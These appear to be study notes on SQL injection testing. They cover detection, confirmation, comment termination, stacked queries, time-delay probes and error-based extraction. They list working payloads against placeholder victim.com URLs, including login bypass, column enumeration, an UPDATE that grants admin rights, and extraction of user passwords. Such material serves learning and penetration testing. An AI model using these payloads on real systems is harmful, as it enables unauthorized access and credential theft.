## I. Find

### 1. Data entry
- Cookies
- Header: host, referer, user-agent
- Parameter in url

- Techniques: manipulate the values:
+ https://victim.com/showproducts.php?category=attacker -> Unknown value
+ https://victim.com/showproducts.php?category=boat' -> Insert single-quote
+ https://victim.com/showproducts.php?category=bi'+'ke [bi''ke, bi'||'ke] -> Encoded characters

* Root: Lack of user input sanitization.
* Solutions: Only accept digits.

### 2. Errors:
#### 2.1 Database Errors:
- Results:
+ Display and visible
+ Hidden in the Page source
+ Redirection to another page
+ Code 500 Internal Server Errror or 302.
+ Not display or display a generic error page.

#### 2.2 SQL Errors:
- MySQL
- Oracle
- PostgreSQL

### 3. Application Response
- Generic error
- HTTP Code Error: 500 or 302 (look the Location in header of 302)
- Response Size: Differ from others.

### 4. Blind Injection
- You can not retrieve infomation, but still can manipulate the query.
- Only detect that some thing strange, need to look closely.
- Like: the id=2' OR 1=1;-- will return all records, but it just return the record of id = 1. It is strange.
- Or: the id=2' AND 1=2;-- it will return nothing, instead, it returns the record of id = 1. It is strange.

## II. Confirming

### 1. Differentinating Number and Strings

- Number not in quote
- Else in quote.

### 2. Inline SQL Injection

- SELECT * FROM administrators WHERE

+ username= '' AND password = '' -> Default
+ username = ''' AND password = '' -> Test with single-quote
+ username= '' OR 1=1 AND password = '' -> return record with blank password or username
+ username= '' OR 1 =1 OR (1=1 AND password = '') -> Three conditions, always true, return all
+ username= 'admin' OR (1=1 AND password = '') -> Return only record for username = admin
+ username= '' AND password = '' OR 1=1 -> return all, always true

- SELECT * FROM messages WHERE uid=45 ORDER BY recieved;
https://www.victim.com/messages/list.aspx?uid=45

- Testing queries

Inline string
+ 'ab'='a'+'b' -> Microsoft SQL Server
+ 'ab' = 'a''b' -> MySQL
+ 'ab' = 'a'||'b' -> Oracle and PostgreSQL

Inline Numeric
+ 1+1 -> If success, it return record for 2
+ val+0 -> If success, it return record for val

Condition
+ OR 1=1 -> Always true
+ AND 1=2 -> Always false

### 3. Terminating SQL injection

#### a. Comment

+ --: MS SQL Sever, Oracle, PostgreSQL one-line
+ /**/: MS SQL Sever, Oracle, PostgreSQL multiple-lines

+ --space/tab/new line/...: MySQL one-line
+ #: MySQL one-line
+ /**/: MySQL multiple-lines

- Exp for situation when only can use /**/:
username = admin'/*
password = */'
-> SELECT * FROM users WHERE username='admin'/*' AND password='*/''
-> SELECT * FROM users WHERE username='admin'''
-> SELECT * FROM users WHERE username='admin'

- Define the remote database:
https://www.victim.com/displayUser.aspx?User=Bob -> Default
+ User=B'+'ob -> MS SQL
+ User=B''ob -> MySQL
+ User=B'||'ob -> Oracle or PosgreSQL

#### b. Execute Multiple Statement

- Test to know all the columns
+ https://www.victim.com/welcome.aspx?User=45; select * from users having 1=1;-- -> Error contain GROUP BY and column name
+ https://www.victim.com/welcome.aspx?User=45; select * from users group by uid having 1=1;-- -> Missing column, keep adding
+ https://www.victim.com/welcome.aspx?User=45; select * from users group by uid, user having 1=1;-- -> Missing column, keep adding
+ https://www.victim.com/welcome.aspx?User=45; select * from users group by uid, user, password having 1=1;-- -> Missing column, keep adding
+ https://www.victim.com/welcome.aspx?User=45; select * from users group by uid, user, password, isadmin having 1=1;-- -> Gotcha, we now know isAdmin, escalate priviledge.
+ https://www.victim.com/welcome.aspx?User=45; UPDATE Users SET isadmin=1 where uid=45-- -> We now become an member of admin's group.

### 4. Time Delays

- It use best with blind sql injection. 
- The rule is: If we set the delay and the response from the server is delayed -> Existence of SQL Injection

- MS SQL: https://www.victim.com/welcome.aspx?User=45; waitfor delay '0:0:5';--
- MySQL: https://www.victim.com/welcome.aspx?User=45; SELECT BENCHMARK(1000000, ENCODE('hello', 'mom'));--
- Oracle: https://www.victim.com/welcome.aspx?User=45 or 1=dbms_pipe.recieve_message('RDS', 10)
- PostgreSQL: https://www.victim.com/welcome.aspx?User=45; SELECT pg_sleep(10);--

## III. Automating

- SQLMap

## IV. Techniques:
- ' -> injectable?
- =asdasdasda -> injectable?
- bi''kes, bi'+'kes, bi'||'kes... -> injectable?

- ' and 1=1/@@version;-- -> It will execute and return a value of version in the error for number divide by int

- ' GROUP BY user having '1'='1';-- -> It will displays the next column like password, keep using it
- ' GROUP BY user, password having '1'='1';-- -> It will displays the next column, keep using it.
- after that, execute this to get the 1st account: ' and 1=1/user;-- or ' and 1=1/password
- or all remains account exclude the known account (exp: Admin): ' AND user NOT IN ('Admin') AND 1=1/user AND 1=1;-- -> It will iterate and displays all, because the condition is always true.

- ' AND '1'='1' LIMIT 3;-- -> Always true and limit all records to 3
- ' AND '1'='2';-- -> Always False
